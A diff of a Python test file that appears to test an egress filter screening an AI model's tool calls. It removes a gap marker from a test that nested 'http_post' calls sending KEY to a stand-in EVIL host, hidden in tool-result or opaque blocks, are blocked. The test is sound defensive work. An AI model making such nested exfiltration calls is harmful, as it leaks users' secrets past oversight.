@@ -527,7 +527,6 @@ def test_redirect_style_url_on_allowed_host_with_key_is_blocked(presidio):
     {"type": "tool_result", "tool_use_id": "outer", "content": [tool_use("http_post", url=EVIL, body=KEY)]},
     {"type": "server_tool_result", "content": [tool_use("http_post", url=EVIL, body=KEY)]},
 ], ids=["in-tool_result", "in-opaque-block"])
-@gap("R5")
 def test_a_nested_tool_call_fails_closed(presidio, container):
     out, ports = egress(model_reply(text("Working."), container), presidio)
     assert_blocked(out, KEY)
